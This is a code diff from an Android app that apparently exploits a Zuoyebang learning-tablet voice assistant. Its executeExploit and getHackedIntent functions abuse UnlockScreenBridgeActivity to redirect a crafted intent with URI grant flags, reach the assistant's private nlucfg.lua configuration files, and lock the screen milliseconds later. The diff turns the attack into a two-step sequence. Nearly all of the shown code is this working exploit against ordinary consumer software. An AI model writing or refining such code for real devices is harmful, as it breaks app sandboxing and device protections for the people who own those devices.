@@ -32,13 +32,13 @@ import com.cfks.supersys.util.UriUtils
 class HomeFragment : Fragment() {
 
     companion object {
-        private const val TARGET_PACKAGE = "com.zuoyebang.iot.pad.zpvoiceassistant"
-        private const val TARGET_ACTIVITY = "com.zuoyebang.iot.pad.zpvoiceassistant.UnlockScreenBridgeActivity"
+        const val TARGET_PACKAGE = "com.zuoyebang.iot.pad.zpvoiceassistant"
+        const val TARGET_ACTIVITY = "com.zuoyebang.iot.pad.zpvoiceassistant.UnlockScreenBridgeActivity"
         private const val FILE_PROVIDER_PATHS_KEY = "android.support.FILE_PROVIDER_PATHS"
 
-        private const val TARGET_FILE_PATH_1 =
+        const val TARGET_FILE_PATH_1 =
             "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/nlucfg.lua"
-        private const val TARGET_FILE_PATH_2 =
+        const val TARGET_FILE_PATH_2 =
             "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/nlucfg.lua"
 
         val TARGET_FILE_PATHS = listOf(TARGET_FILE_PATH_1, TARGET_FILE_PATH_2)
@@ -219,16 +219,18 @@ class HomeFragment : Fragment() {
     private fun executeExploit(authority: String, rootName: String) {
         val ctx = requireContext()
 
-        // Launch exploit for both target files
-        for (targetFilePath in TARGET_FILE_PATHS) {
-            val uriStr = if (rootName.isNotEmpty()) {
-                "content://$authority/$rootName$targetFilePath"
-            } else {
-                "content://$authority$targetFilePath"
-            }
-            val hackedIntent = getHackedIntent(uriStr)
-            StartAnyWhere.pullSpecialActivity(ctx, hackedIntent)
+        // Clear any previous errors
+        MainActivity.installErrors.clear()
+
+        // Only launch exploit for the first file — step 2 will be triggered by MainActivity
+        val targetFilePath = TARGET_FILE_PATHS[0]
+        val uriStr = if (rootName.isNotEmpty()) {
+            "content://$authority/$rootName$targetFilePath"
+        } else {
+            "content://$authority$targetFilePath"
         }
+        val hackedIntent = getHackedIntent(uriStr, 1)
+        StartAnyWhere.pullSpecialActivity(ctx, hackedIntent)
 
         // Lock screen ~15ms later (concurrent but slightly delayed)
         Handler(Looper.getMainLooper()).postDelayed({
@@ -236,7 +238,7 @@ class HomeFragment : Fragment() {
         }, 15)
     }
 
-    private fun getHackedIntent(url: String): Intent {
+    private fun getHackedIntent(url: String, step: Int): Intent {
         val ctx = requireContext()
 
         // intent1: targets UnlockScreenBridgeActivity
@@ -253,13 +255,14 @@ class HomeFragment : Fragment() {
             "*/*"
         }
 
-        // intent2: targets our own MainActivity with the file URI + grant flags + install marker
+        // intent2: targets our own MainActivity with the file URI + grant flags + install marker + step
         val intent2 = Intent()
             .setComponent(
                 ComponentName(ctx.packageName, MainActivity::class.java.name)
             )
             .setDataAndType(uri, mimeType)
-            .putExtra(EXTRA_SUPERSYS_INSTALL, true)
+            .putExtra(MainActivity.EXTRA_SUPERSYS_INSTALL, true)
+            .putExtra(MainActivity.EXTRA_INSTALL_STEP, step)
             .addFlags(
                 Intent.FLAG_GRANT_PREFIX_URI_PERMISSION or
                 Intent.FLAG_GRANT_READ_URI_PERMISSION or
